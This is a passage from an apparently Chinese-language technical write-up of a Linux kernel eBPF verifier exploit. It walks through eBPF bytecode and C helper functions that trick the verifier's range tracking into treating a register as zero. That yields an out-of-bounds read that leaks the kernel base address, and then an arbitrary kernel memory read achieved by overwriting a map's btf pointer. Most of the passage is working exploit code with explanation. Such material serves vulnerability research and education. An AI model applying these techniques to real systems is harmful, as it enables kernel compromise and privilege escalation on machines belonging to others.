<a href="#__codelineno-20-2" id="__codelineno-20-2" name="__codelineno-20-2"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
<a href="#__codelineno-20-3" id="__codelineno-20-3" name="__codelineno-20-3"></a><span class="w">    </span><span class="kt">ssize_t</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">write</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
<a href="#__codelineno-20-4" id="__codelineno-20-4" name="__codelineno-20-4"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-20-5" id="__codelineno-20-5" name="__codelineno-20-5"></a><span class="p">}</span>
</code></pre></div>
<p>接下来我们分析<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-21-1" id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="c1">// Part 1 (trigger vulnerability)</span>
<a href="#__codelineno-21-2" id="__codelineno-21-2" name="__codelineno-21-2"></a><span class="n">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_9</span><span class="p">,</span><span class="n">ctrl_mapfd</span><span class="p">),</span><span class="w">            </span><span class="c1">// r9 = ctrl_mapfd</span>
<a href="#__codelineno-21-3" id="__codelineno-21-3" name="__codelineno-21-3"></a><span class="n">BPF_MAP_GET</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">BPF_REG_8</span><span class="p">),</span><span class="w">                       </span><span class="c1">// r8 = ctrl_buf[0] (0x?000..00110)</span>
<a href="#__codelineno-21-4" id="__codelineno-21-4" name="__codelineno-21-4"></a><span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_0</span><span class="p">),</span><span class="w">            </span><span class="c1">// r6 = r0             </span>
<a href="#__codelineno-21-5" id="__codelineno-21-5" name="__codelineno-21-5"></a>
<a href="#__codelineno-21-6" id="__codelineno-21-6" name="__codelineno-21-6"></a><span class="n">BPF_LD_IMM64</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span><span class="mh">0x4000000000</span><span class="p">),</span><span class="w">           </span><span class="c1">// r2 = 0x4000000000</span>
<a href="#__codelineno-21-7" id="__codelineno-21-7" name="__codelineno-21-7"></a><span class="n">BPF_LD_IMM64</span><span class="p">(</span><span class="n">BPF_REG_3</span><span class="p">,</span><span class="mh">0x2000000000</span><span class="p">),</span><span class="w">           </span><span class="c1">// r3 = 0x2000000000</span>
<a href="#__codelineno-21-8" id="__codelineno-21-8" name="__codelineno-21-8"></a><span class="n">BPF_LD_IMM64</span><span class="p">(</span><span class="n">BPF_REG_4</span><span class="p">,</span><span class="mh">0xFFFFffff</span><span class="p">),</span><span class="w">             </span><span class="c1">// r4 = 0xFFFFffff</span>
<a href="#__codelineno-21-9" id="__codelineno-21-9" name="__codelineno-21-9"></a><span class="n">BPF_LD_IMM64</span><span class="p">(</span><span class="n">BPF_REG_5</span><span class="p">,</span><span class="mh">0x1</span><span class="p">),</span><span class="w">                    </span><span class="c1">// r5 = 0x1</span>
<a href="#__codelineno-21-10" id="__codelineno-21-10" name="__codelineno-21-10"></a>
<a href="#__codelineno-21-11" id="__codelineno-21-11" name="__codelineno-21-11"></a><span class="n">BPF_JMP_REG</span><span class="p">(</span><span class="n">BPF_JGT</span><span class="p">,</span><span class="n">BPF_REG_8</span><span class="p">,</span><span class="n">BPF_REG_2</span><span class="p">,</span><span class="mi">5</span><span class="p">),</span><span class="w">     </span><span class="c1">// if r8 &gt; 0x4000000000 goto +5 (exit(0))</span>
<a href="#__codelineno-21-12" id="__codelineno-21-12" name="__codelineno-21-12"></a><span class="n">BPF_JMP_REG</span><span class="p">(</span><span class="n">BPF_JLT</span><span class="p">,</span><span class="n">BPF_REG_8</span><span class="p">,</span><span class="n">BPF_REG_3</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="w">     </span><span class="c1">// if r8 &lt; 0x2000000000 goto +4 (exit(0))</span>
<a href="#__codelineno-21-13" id="__codelineno-21-13" name="__codelineno-21-13"></a><span class="n">BPF_JMP32_REG</span><span class="p">(</span><span class="n">BPF_JGT</span><span class="p">,</span><span class="n">BPF_REG_8</span><span class="p">,</span><span class="n">BPF_REG_4</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span><span class="w">   </span><span class="c1">// if w8 &gt; 0xFFFFffff goto +3 (exit(0))</span>
<a href="#__codelineno-21-14" id="__codelineno-21-14" name="__codelineno-21-14"></a><span class="n">BPF_JMP32_REG</span><span class="p">(</span><span class="n">BPF_JLT</span><span class="p">,</span><span class="n">BPF_REG_8</span><span class="p">,</span><span class="n">BPF_REG_5</span><span class="p">,</span><span class="mi">2</span><span class="p">),</span><span class="w">   </span><span class="c1">// if w8 &lt; 0x1 goto +2 (exit(0))</span>
<a href="#__codelineno-21-15" id="__codelineno-21-15" name="__codelineno-21-15"></a>
<a href="#__codelineno-21-16" id="__codelineno-21-16" name="__codelineno-21-16"></a><span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_AND</span><span class="p">,</span><span class="n">BPF_REG_8</span><span class="p">,</span><span class="n">BPF_REG_4</span><span class="p">),</span><span class="w">     </span><span class="c1">// r8 = r8 &amp; 0xFFFFffff (0x110，但 verifier 已经认为其就是 0)</span>
<a href="#__codelineno-21-17" id="__codelineno-21-17" name="__codelineno-21-17"></a><span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JA</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">),</span><span class="w">                   </span><span class="c1">// goto +2 (Part 2)</span>
<a href="#__codelineno-21-18" id="__codelineno-21-18" name="__codelineno-21-18"></a>
<a href="#__codelineno-21-19" id="__codelineno-21-19" name="__codelineno-21-19"></a><span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">),</span><span class="w">                   </span><span class="c1">// r0 = 0</span>
<a href="#__codelineno-21-20" id="__codelineno-21-20" name="__codelineno-21-20"></a><span class="n">BPF_EXIT_INSN</span><span class="p">(),</span><span class="w">                                </span><span class="c1">// exit(0) (r8 不满足条件)</span>
</code></pre></div>
<p><span>Part 1<span class="heti-spacing"> </span></span>用于处理输入参数并触发漏洞。首先读取<span class="heti-skip"><span class="heti-spacing"> </span>ctrl_map<span class="heti-spacing"> </span></span>的第一个<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位值作为<span><span class="heti-spacing"> </span>r8</span>，然后<span class="heti-skip"><span class="heti-spacing"> </span>r6 = r0<span class="heti-spacing"> </span></span>是参数地址，也就是<span class="heti-skip"><span class="heti-spacing"> </span>ctrl_buf<span class="heti-spacing"> </span></span>的实际存储空间，用来向攻击用户传回结果。接下来几个<span class="heti-skip"><span class="heti-spacing"> </span>JMP<span class="heti-spacing"> </span></span>设置了<span class="heti-skip"><span class="heti-spacing"> </span>r8<span class="heti-spacing"> </span></span>的<span><span class="heti-spacing"> </span>u{min,max}_value</span>，并触发了漏洞，这样在和<span class="heti-skip"><span class="heti-spacing"> </span>0xffffffff<span class="heti-spacing"> </span></span>取或之后<span class="heti-skip"><span class="heti-spacing"> </span>r8<span class="heti-spacing"> </span></span>就变成了<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>完全确定的<span><span class="heti-spacing"> </span>0</span>，但其值实际上是我们传入的<span class="heti-skip"><span class="heti-spacing"> </span>ctrl_buf<span class="heti-spacing"> </span></span>的首个<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位值的低<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位，我们设置其低<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>为<span><span class="heti-spacing"> </span>0x110</span>，接下来就可以进入到<span class="heti-skip"><span class="heti-spacing"> </span>Part 2<span class="heti-spacing"> </span></span>中泄漏内核地址。</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-22-1" id="__codelineno-22-1" name="__codelineno-22-1"></a><span class="c1">// Part 2 (leak info)</span>
<a href="#__codelineno-22-2" id="__codelineno-22-2" name="__codelineno-22-2"></a><span class="n">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_9</span><span class="p">,</span><span class="n">exp_mapfd</span><span class="p">),</span><span class="w">             </span><span class="c1">// r9 = exp_mapfd</span>
<a href="#__codelineno-22-3" id="__codelineno-22-3" name="__codelineno-22-3"></a><span class="n">BPF_MAP_GET_ADDR</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">),</span><span class="w">                  </span><span class="c1">// r7 = &amp;exp_buf[0]</span>
<a href="#__codelineno-22-4" id="__codelineno-22-4" name="__codelineno-22-4"></a><span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="n">BPF_REG_8</span><span class="p">),</span><span class="w">     </span><span class="c1">// r7 = r7 - r8 = &amp;exp_buf[0] - 0x110</span>
<a href="#__codelineno-22-5" id="__codelineno-22-5" name="__codelineno-22-5"></a>
<a href="#__codelineno-22-6" id="__codelineno-22-6" name="__codelineno-22-6"></a><span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="w">      </span><span class="c1">// r0 = *(u64 *)(r7)</span>
<a href="#__codelineno-22-7" id="__codelineno-22-7" name="__codelineno-22-7"></a><span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="n">BPF_REG_6</span><span class="p">,</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">),</span><span class="w">   </span><span class="c1">// *(u64 *)(r6 + 0x10) = r0</span>
<a href="#__codelineno-22-8" id="__codelineno-22-8" name="__codelineno-22-8"></a>
<a href="#__codelineno-22-9" id="__codelineno-22-9" name="__codelineno-22-9"></a><span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">),</span><span class="w">   </span><span class="c1">// r0 = *(u64 *)(r7 + 0xc0)</span>
<a href="#__codelineno-22-10" id="__codelineno-22-10" name="__codelineno-22-10"></a><span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">),</span><span class="w">          </span><span class="c1">// r0 = r0 + 0x110 - 0xc0 = &amp;exp_buf</span>
</code></pre></div>
<p><span>Part 2<span class="heti-spacing"> </span></span>中首先取出<span class="heti-skip"><span class="heti-spacing"> </span>exp_map<span class="heti-spacing"> </span></span>的地址，然后减去<span><span class="heti-spacing"> </span>r8</span>，这时<span class="heti-skip"><span class="heti-spacing"> </span>verifer<span class="heti-spacing"> </span></span>认为其减了<span class="heti-skip"><span class="heti-spacing"> </span>0<span class="heti-spacing"> </span></span>没有问题，但实际上已经减了<span class="heti-skip"><span class="heti-spacing"> </span>0x110<span class="heti-spacing"> </span></span>到了<span class="heti-skip"><span class="heti-spacing"> </span>bpf_map<span class="heti-spacing"> </span></span>的首地址，接下来取出首地址的值存回<span class="heti-skip"><span class="heti-spacing"> </span>ctrl_buf+0x10<span class="heti-spacing"> </span></span>即 <code>ctrl_buf[2]</code>，就可以在用户态读取，泄露出内核地址：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-23-1" id="__codelineno-23-1" name="__codelineno-23-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">leak_info</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mapfd</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-23-2" id="__codelineno-23-2" name="__codelineno-23-2"></a><span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<a href="#__codelineno-23-3" id="__codelineno-23-3" name="__codelineno-23-3"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bpf_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">mapfd</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-23-4" id="__codelineno-23-4" name="__codelineno-23-4"></a><span class="w">        </span><span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<a href="#__codelineno-23-5" id="__codelineno-23-5" name="__codelineno-23-5"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-23-6" id="__codelineno-23-6" name="__codelineno-23-6"></a><span class="p">}</span>
<a href="#__codelineno-23-7" id="__codelineno-23-7" name="__codelineno-23-7"></a>
<a href="#__codelineno-23-8" id="__codelineno-23-8" name="__codelineno-23-8"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-23-9" id="__codelineno-23-9" name="__codelineno-23-9"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-23-10" id="__codelineno-23-10" name="__codelineno-23-10"></a><span class="w">    </span><span class="n">execute_with_op</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a href="#__codelineno-23-11" id="__codelineno-23-11" name="__codelineno-23-11"></a><span class="w">    </span><span class="n">leak_info</span><span class="p">(</span><span class="n">ctrl_buf</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl_mapfd</span><span class="p">);</span>
<a href="#__codelineno-23-12" id="__codelineno-23-12" name="__codelineno-23-12"></a><span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">map_leak</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctrl_buf</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
<a href="#__codelineno-23-13" id="__codelineno-23-13" name="__codelineno-23-13"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] leak array_map_ops:</span><span class="se">\t\t</span><span class="s">0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">map_leak</span><span class="p">);</span>
<a href="#__codelineno-23-14" id="__codelineno-23-14" name="__codelineno-23-14"></a><span class="w">    </span><span class="n">kernel_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">map_leak</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x1016480</span><span class="p">;</span>
<a href="#__codelineno-23-15" id="__codelineno-23-15" name="__codelineno-23-15"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] leak kernel_base addr:</span><span class="se">\t</span><span class="s">0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">kernel_base</span><span class="p">);</span>
<a href="#__codelineno-23-16" id="__codelineno-23-16" name="__codelineno-23-16"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-23-17" id="__codelineno-23-17" name="__codelineno-23-17"></a><span class="p">}</span>
<a href="#__codelineno-23-18" id="__codelineno-23-18" name="__codelineno-23-18"></a>
<a href="#__codelineno-23-19" id="__codelineno-23-19" name="__codelineno-23-19"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">execute_with_op</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">op</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-23-20" id="__codelineno-23-20" name="__codelineno-23-20"></a><span class="w">    </span><span class="n">ctrl_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2000000000</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x110</span><span class="p">;</span>
<a href="#__codelineno-23-21" id="__codelineno-23-21" name="__codelineno-23-21"></a><span class="w">    </span><span class="n">ctrl_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">op</span><span class="p">;</span>
<a href="#__codelineno-23-22" id="__codelineno-23-22" name="__codelineno-23-22"></a><span class="w">    </span><span class="n">bpf_update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl_buf</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl_mapfd</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a href="#__codelineno-23-23" id="__codelineno-23-23" name="__codelineno-23-23"></a><span class="w">    </span><span class="n">bpf_update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">exp_buf</span><span class="p">,</span><span class="w"> </span><span class="n">exp_mapfd</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a href="#__codelineno-23-24" id="__codelineno-23-24" name="__codelineno-23-24"></a><span class="w">    </span><span class="n">execute</span><span class="p">();</span>
<a href="#__codelineno-23-25" id="__codelineno-23-25" name="__codelineno-23-25"></a><span class="p">}</span>
</code></pre></div>
<p>在<span class="heti-skip"><span class="heti-spacing"> </span>Part 2<span class="heti-spacing"> </span></span>的末尾我们还需要得到<span class="heti-skip"><span class="heti-spacing"> </span>exp_buf<span class="heti-spacing"> </span></span>的地址用于后续<span class="heti-skip"><span class="heti-spacing"> </span>Part 4<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>map_ops<span class="heti-spacing"> </span></span>覆盖，在 <code>bpf_map</code> 的<span class="heti-skip"><span class="heti-spacing"> </span>0xc0<span class="heti-spacing"> </span></span>偏移处，有一个<span class="heti-skip"><span class="heti-spacing"> </span>wait_list<span class="heti-spacing"> </span></span>链表，其中第一个值就是一个指向自身的指针，所以我们可以通过读取这个值来得到<span class="heti-skip"><span class="heti-spacing"> </span>exp_buf<span class="heti-spacing"> </span></span>的地址：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-24-1" id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">),</span><span class="w">   </span><span class="c1">// r0 = *(u64 *)(r7 + 0xc0)</span>
<a href="#__codelineno-24-2" id="__codelineno-24-2" name="__codelineno-24-2"></a><span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">),</span><span class="w">          </span><span class="c1">// r0 = r0 + 0x110 - 0xc0 = &amp;exp_buf</span>
</code></pre></div>
<p>这里不直接从最开始的<span class="heti-skip"><span class="heti-spacing"> </span>r7<span class="heti-spacing"> </span></span>得到地址是因为<span class="heti-skip"><span class="heti-spacing"> </span>r7<span class="heti-spacing"> </span></span>的类型是指针，<span>verifier<span class="heti-spacing"> </span></span>不允许写入指针，而经过如此操作读取出来的是标量值，可以后续写入到<span class="heti-skip"><span class="heti-spacing"> </span>map_ops<span class="heti-spacing"> </span></span>中。</p>
<p>接下来<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>Part 3<span class="heti-spacing"> </span></span>用于进行任意地址读：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-25-1" id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="c1">// Part 3 (arbitrary read)</span>
<a href="#__codelineno-25-2" id="__codelineno-25-2" name="__codelineno-25-2"></a><span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="n">BPF_REG_8</span><span class="p">,</span><span class="n">BPF_REG_6</span><span class="p">,</span><span class="mh">0x8</span><span class="p">),</span><span class="w">    </span><span class="c1">// r8 = *(u64 *)(r6 + 0x8) = op</span>
<a href="#__codelineno-25-3" id="__codelineno-25-3" name="__codelineno-25-3"></a><span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_8</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">),</span><span class="w">          </span><span class="c1">// if r8 != 1 goto +4</span>
<a href="#__codelineno-25-4" id="__codelineno-25-4" name="__codelineno-25-4"></a><span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="n">BPF_REG_6</span><span class="p">,</span><span class="mh">0x20</span><span class="p">),</span><span class="w">   </span><span class="c1">// r0 = *(u64 *)(r6 + 0x20) = addr</span>
<a href="#__codelineno-25-5" id="__codelineno-25-5" name="__codelineno-25-5"></a><span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">),</span><span class="w">   </span><span class="c1">// *(u64 *)(r7 + 0x40) = r0 (bpf_map-&gt;btf = addr-0x58)</span>
<a href="#__codelineno-25-6" id="__codelineno-25-6" name="__codelineno-25-6"></a><span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">),</span><span class="w">                   </span><span class="c1">// exit(0)</span>
<a href="#__codelineno-25-7" id="__codelineno-25-7" name="__codelineno-25-7"></a><span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>
</code></pre></div>
<p>先读取 <code>ctrl_buf[1]</code> 作为参数<span><span class="heti-spacing"> </span>op</span>，如果是<span class="heti-skip"><span class="heti-spacing"> </span>1<span class="heti-spacing"> </span></span>表示读、<span>2<span class="heti-spacing"> </span></span>表示写、<span>0<span class="heti-spacing"> </span></span>表示不读也不写（比如泄漏地址的时候执行的就是 <code>update_elem(0)</code> 设置<span class="heti-skip"><span class="heti-spacing"> </span>op<span class="heti-spacing"> </span></span>为<span class="heti-skip"><span class="heti-spacing"> </span>0<span class="heti-spacing"> </span></span>不读也不写<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>。然后如果<span class="heti-skip"><span class="heti-spacing"> </span>op<span class="heti-spacing"> </span></span>是<span><span class="heti-spacing"> </span>1</span>，就会执行下面的代码。</p>
<p>接下来读取了<span><span class="heti-spacing"> </span>r6+0x20</span>，也就是 <code>ctrl_buf[4]</code>，我们令这个参数为<span><span class="heti-spacing"> </span>target-0x58</span>，然后存入<span class="heti-skip"><span class="heti-spacing"> </span>r0<span class="heti-spacing"> </span></span>寄存器中，接下来存入<span><span class="heti-spacing"> </span>r7+0x40</span>，<span>r7<span class="heti-spacing"> </span></span>是<span class="heti-skip"><span class="heti-spacing"> </span>bpf_map<span class="heti-spacing"> </span></span>的开头，所以<span class="heti-skip"><span class="heti-spacing"> </span>0x40<span class="heti-spacing"> </span></span>偏移处就是<span class="heti-skip"><span class="heti-spacing"> </span>btf<span class="heti-spacing"> </span></span>指针的位置。接下来通过调用 <code>bpf_map_get_info_by_fd</code> 就可以触发任意地址读，读取出<span class="heti-skip"><span class="heti-spacing"> </span>target<span class="heti-spacing"> </span></span>处<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位的值：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-26-1" id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">arbitrary_read32</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-26-2" id="__codelineno-26-2" name="__codelineno-26-2"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">read_info</span><span class="p">;</span>
<a href="#__codelineno-26-3" id="__codelineno-26-3" name="__codelineno-26-3"></a>
<a href="#__codelineno-26-4" id="__codelineno-26-4" name="__codelineno-26-4"></a><span class="w">    </span><span class="n">ctrl_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x2000000000</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x110</span><span class="p">;</span>
<a href="#__codelineno-26-5" id="__codelineno-26-5" name="__codelineno-26-5"></a><span class="w">    </span><span class="n">ctrl_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<a href="#__codelineno-26-6" id="__codelineno-26-6" name="__codelineno-26-6"></a><span class="w">    </span><span class="n">ctrl_buf</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x58</span><span class="p">;</span>
<a href="#__codelineno-26-7" id="__codelineno-26-7" name="__codelineno-26-7"></a>
<a href="#__codelineno-26-8" id="__codelineno-26-8" name="__codelineno-26-8"></a><span class="w">    </span><span class="n">bpf_update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl_buf</span><span class="p">,</span><span class="w"> </span><span class="n">ctrl_mapfd</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a href="#__codelineno-26-9" id="__codelineno-26-9" name="__codelineno-26-9"></a><span class="w">    </span><span class="n">bpf_update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">exp_buf</span><span class="p">,</span><span class="w"> </span><span class="n">exp_mapfd</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a href="#__codelineno-26-10" id="__codelineno-26-10" name="__codelineno-26-10"></a><span class="w">    </span><span class="n">execute</span><span class="p">();</span>
<a href="#__codelineno-26-11" id="__codelineno-26-11" name="__codelineno-26-11"></a>
<a href="#__codelineno-26-12" id="__codelineno-26-12" name="__codelineno-26-12"></a><span class="w">    </span><span class="n">read_info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bpf_map_get_info_by_fd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">exp_buf</span><span class="p">,</span><span class="w"> </span><span class="n">exp_mapfd</span><span class="p">,</span><span class="w"> </span><span class="n">info</span><span class="p">);</span>
<a href="#__codelineno-26-13" id="__codelineno-26-13" name="__codelineno-26-13"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">read_info</span><span class="p">;</span>
<a href="#__codelineno-26-14" id="__codelineno-26-14" name="__codelineno-26-14"></a><span class="p">}</span>
<a href="#__codelineno-26-15" id="__codelineno-26-15" name="__codelineno-26-15"></a>
<a href="#__codelineno-26-16" id="__codelineno-26-16" name="__codelineno-26-16"></a><span class="k">static</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="nf">arbitrary_read</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-26-17" id="__codelineno-26-17" name="__codelineno-26-17"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">addr_low</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arbitrary_read32</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
<a href="#__codelineno-26-18" id="__codelineno-26-18" name="__codelineno-26-18"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">addr_high</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arbitrary_read32</span><span class="p">(</span><span class="n">addr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x4</span><span class="p">);</span>
